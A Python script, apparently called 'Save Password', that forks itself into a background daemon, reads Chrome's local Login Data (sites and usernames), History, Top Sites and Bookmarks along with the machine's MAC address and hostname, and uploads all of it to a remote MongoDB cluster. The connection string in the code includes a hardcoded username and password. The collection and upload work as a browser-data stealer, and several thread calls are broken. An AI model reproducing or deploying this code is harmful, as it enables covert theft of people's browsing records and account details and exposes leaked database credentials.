import sqlite3
from sqlite3 import Error
import getpass
import json
import threading
from pymongo import MongoClient
import uuid
import socket
import platform
import sys
import datetime
import bcrypt
import os, sys
import gi
gi.require_version('Notify', '0.7')
from gi.repository import Notify,GdkPixbuf

fpid = os.fork()
if fpid!=0:
  # Running as daemon now. PID is fpid
  sys.exit(0)

login_data = list()
top_sites = list()
history = list()
bookmarks = list()

user_mac = str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()
host_name = socket.gethostname()
user_os = platform.node()
date = datetime.datetime.now()
user_email = None

class Bookmarks:
    def __init__(self,date,name,url):
        self.name = name
        self.date = date
        self.url = url

class MongoDB:
    def __init__(self):
        client = MongoClient("mongodb+srv://benura:Benura123@clust1-tn0nm.mongodb.net/test?ssl=true&retryWrites=true&w=majority")
        print(client)
        self.client = client
        db = self.client.save_password
        self.db = db

    # def checkCollectionExists(self, email):
    #     history_collection = "history"
    #     login_collection = "login_data"
    #     top_sites_collection = "top_sites"
    #     bookmarks_collection = "bookmarks"
    #     machine_details_collection = "machine_details"
    #     print(self.db.list_collection_names())
    #     if(history_collection in self.db.list_collection_names() or login_collection in self.db.list_collection_names() or top_sites_collection in self.db.list_collection_names() or ):
    #         return True
    #     else:
    #         self.createDatabaseCollection(email)
    #         return False

    # def createDatabaseCollection(self,email):
    #     self.user_collection = self.db[email]

    def updateHistory(self,history_array):
        history_document = {
            "type": "history",
            "date": date,
            "history": history_array,
            "email": user_email
        }
        #print(self.user_collection.name)
        if(self.db.history.find({'type': 'history','email': user_email}).count() == 0):
            self.db.history.insert_one(history_document)
        else:
            self.db.history.update_one({'type':'history', 'email': user_email}, {"$set": history_document})

    def updateTopSites(self, top_sites_array):
        top_sites_document = {
            "type": "top_sites",
            "date": date,
            "email": user_email,
            "top_sites": top_sites_array
        }
        if(self.db.top_sites.find({'type': 'top_sites', 'email': user_email}).count() == 0):
            self.db.top_sites.insert_one(top_sites_document)
        else:
            top_sites_document = {
            "type": "top_sites",
            "date": date,
            "top_sites": top_sites_array
            }
            self.db.top_sites.update_one({'type': 'top_sites', 'email': user_email}, {"$set": top_sites_document})

    def updateLoginData(self, login_data_array):
        login_data_document = {
            "type": "login_data",
            "date": date,
            "email": user_email,
            "login": login_data_array
        }
        if(self.db.login_data.find({'type': 'login_data', "email": user_email}).count() == 0):
            self.db.login_data.insert_one(login_data_document)
        else:
            login_data_document = {
            "type": "login_data",
            "date": date,
            "login": login_data_array
            }
            self.db.login_data.update_one({'type': 'login_data', 'email': user_email}, {"$set": login_data_document})

    def updateBookmarks(self, bookmarks_array):
        bookmarks_document = {
            "type": "bookmarks",
            "date": date,
            "email": user_email,
            "bookmarks": bookmarks_array
        }
        if(self.db.bookmarks.find({'type': 'bookmarks'}).count() == 0):
            self.db.bookmarks.insert_one(dict(bookmarks_document))
        else:
            bookmarks_document = {
                "type": "bookmarks",
                "date": date,
                "bookmarks": bookmarks_array
            }
            self.db.bookmarks.update_one({'type': 'bookmarks', "emial": user_email}, {"$set": bookmarks_document})

    def updateMachineDetails(self):
        machine_details = {
            "type": "machine_details",
            "date": date,
            "user": user,
            "mac": user_mac,
            "host_name": host_name,
            "os": user_os,
            "email": user_email
        }
        if(self.db.machine_details.find({'type': 'machine_details', 'email': user_email}).count() == 0):
            self.db.machine_details.insert_one(machine_details)
        else:
            self.db.machine_details.update_one({'type': 'machine_details', 'email': user_email}, {"$set": machine_details})

    # def updateUser(self,email,password):
    #     salt = bcrypt.gensalt()
    #     hashed_password = bcrypt.hashpw(password.encode(), salt)
    #     user_details = {
    #         "type": "user_credentials",
    #         "user_name": email,
    #         "date": date,
    #         "password": hashed_password
    #     }
    #     if(self.user_collection.find({'type': 'user_credentials'}).count() == 0):
    #         self.user_collection.insert_one(user_details)
    #     else:
    #         self.user_collection.update_one({'type': 'user_credentials'}, user_details)

    def validateUser(self, email, password):
        doc = self.db.users.find_one({'type': 'user_credentials', 'email': email})
        # print(type(doc))
        # print(doc)
        if(doc is not None):
            user_doc = self.db.users.find_one({'type': 'user_credentials', 'email': email})
            if(user_doc):
                user_doc_data = user_doc
                print(user_doc_data['password'])
                user_password = user_doc_data['password']
                is_correct = bcrypt.checkpw(password.encode(), user_password)
                if(is_correct):
                    return False
                else:
                    return True
            else:
                return True
        else:
            return True

mongoDB = MongoDB()

def send_notification():
    Notify.init("Save Password")
    notification = Notify.Notification.new("Invalid Credentials!","Please provide correct credentials and re-run.")
    image = GdkPixbuf.Pixbuf.new_from_file("/home/benura/gcloud.svg")
    notification.set_icon_from_pixbuf(image)
    notification.set_image_from_pixbuf(image)
    notification.show()

def create_connection(db_file):
    conn = ""
    path = '/home/'+user+'/.config/google-chrome/Default/'+db_file
    print(path)
    try:
        conn = sqlite3.connect(path)
        print(conn)
    except Error as e:
        print(e)

    return conn


def getLoginDetails(conn):
    print("Process 1")
    freezeDatabse(conn)
    cur = conn.cursor()
    cur.execute("SELECT origin_url,username_value FROM logins")

    rows = cur.fetchall()

    for row in rows:
        #print(row)
        login_data.append(row)
        # with open("password.txt",'wb') as file:
        #     file.write(row[1])
    try:
       mongoDB.updateLoginData(login_data)
    except BaseException as e:
        print("CONN1", e)

def getHistory(conn):
    print("Process 2")
    freezeDatabse(conn)
    cur = conn.cursor()
    cur.execute("SELECT url,title,visit_count,last_visit_time FROM urls")

    rows = cur.fetchall()

    for row in rows:
        #print(row)
        history.append(row)
    try:
        mongoDB.updateHistory(history)
    except BaseException as e:
        print("CONN2", e)


def getTopSites(conn):
    print("Process 3")
    freezeDatabse(conn)
    cur = conn.cursor()
    cur.execute("SELECT url,url_rank,title FROM top_sites")

    rows = cur.fetchall()

    for row in rows:
        #print(row)
        top_sites.append(row)
    try:
       mongoDB.updateTopSites(top_sites)
    except BaseException as e:
        print("CONN3", e)
    

def getBookmarks():
    print("Process 4")
    path = '/home/'+user+'/.config/google-chrome/Default/Bookmarks'
    with open(path) as json_file:
        data = json.load(json_file)
    roots = data['roots']
    book_marks_bar = roots['bookmark_bar']
    children = book_marks_bar['children']
    for p in children:
       # bookmarks.append(Bookmarks(p['date_added'],p['name'],p['url']))
        bookmarks.append({'date_added':p['date_added'],'name':p['name'],'url':p['url']})

    try:
        mongoDB.updateBookmarks(bookmarks)
    except BaseException as e:
        print("CONN4", e)


def freezeDatabse(conn):
    conn.commit()
    
def main(email, password):
    try:
        # create a database connection for 'Login Data'
        conn = create_connection("Login Data")
        #print(conn)
        with conn:
            print("Get Login Data")
            thread1 = threading.Thread(target=getLoginDetails(conn))
            thread1.start()
    except Error as e:
        print(e)
    finally:
        try:
            # create a database connection for 'History'
            conn = create_connection("History")
            #print(conn)
            with conn:
                print("Get History")
                thread2 = threading.Thread(target=getHistory(conn))
                thread2.start()
        except Error as e:
            print(e)
        finally:
            try:
                # create a database conection for 'Top Sites'
                conn = create_connection("Top Sites")
                print(conn)
                with conn:
                    print("Get Top Sites")
                    thread3 = threading.Thread(target=getTopSites(conn))
                    thread3.start()
            except Error as e:
                print(e)
            finally:
                # create a database connection for 'Bookmarks'
                try:
                    with conn:
                        print("Get Bookmarks")
                        thread4 = threading.Thread(target=getBookmarks())
                        thread4.start()
                except Error as e:
                    print(e)
                finally:
                    try:
                        mongoDB.updateMachineDetails()
                    except:
                        print("Error Updating Machine Details!")
                    finally:
                        # try:
                        #     mongoDB.updateUser(email, password)
                        # except:
                        #     print("Error Updating User!")
                        # finally:
                        print("Updated!")
    

if __name__ == '__main__':
    user = getpass.getuser()
    print("USER",user)
    if(len(sys.argv) != 4):
        print("Invalid Number of arguments!")
    else:
        user_email = sys.argv[1]
        path = sys.argv[3]
        image_path = path+"/save-password.svg"
        isInValid = mongoDB.validateUser(sys.argv[1], sys.argv[2])
        if(not isInValid):
            main(sys.argv[1], sys.argv[2])
        else:
            send_notification()
            print('Credentials Not Valid')
